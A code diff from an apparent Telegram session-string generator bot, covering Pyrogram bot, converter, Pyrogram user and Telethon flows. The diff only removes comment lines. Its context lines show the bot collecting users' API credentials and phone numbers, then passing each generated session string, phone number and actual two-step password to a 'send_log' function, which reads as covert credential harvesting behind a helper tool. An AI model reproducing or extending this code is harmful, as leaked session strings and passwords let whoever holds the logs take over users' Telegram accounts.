@@ -28,7 +28,6 @@ async def session_cb(_, query: CallbackQuery):
         except Exception:
             pass
 
-        # ---------- Pyrogram Bot ----------
         if data == "pyro_bot":
             await app.send_message(user_id, "🤖 **Send your Bot Token:**", reply_markup=CANCEL_BTN)
             m = await app.listen(user_id)
@@ -45,7 +44,6 @@ async def session_cb(_, query: CallbackQuery):
             await send_log(user, "Pyrogram Bot", s, "N/A (Bot Token)")
             return
 
-        # ---------- Converter ----------
         if data == "convert":
             await app.send_message(user_id, "🔄 **Send your Pyrogram Session String:**", reply_markup=CANCEL_BTN)
             m = await app.listen(user_id)
@@ -68,7 +66,6 @@ async def session_cb(_, query: CallbackQuery):
             await send_log(me, "Converter", tele_str, getattr(me, "phone_number", "N/A") or "N/A")
             return
 
-        # ---------- User sessions ----------
         await app.send_message(user_id, "🆔 **Send your API ID:**", reply_markup=CANCEL_BTN)
         m = await app.listen(user_id)
         if await _cancel(m):
@@ -87,7 +84,6 @@ async def session_cb(_, query: CallbackQuery):
             return
         phone = m.text.strip()
 
-        # ---------- Pyrogram User ----------
         if data == "pyro_user":
             from pyrogram import Client as PC
             uc = PC(f"gen_{user_id}", api_id=api_id, api_hash=api_hash, in_memory=True)
@@ -122,7 +118,6 @@ async def session_cb(_, query: CallbackQuery):
             await send_premium_string(user_id, "Pyrogram User Session", s, has_2fa, joined, failed)
             await send_log(user, "Pyrogram User", s, phone, has_2fa, real_pwd, joined)
 
-        # ---------- Telethon ----------
         elif data == "telethon":
             from telethon.sync import TelegramClient
             from telethon.sessions import StringSession
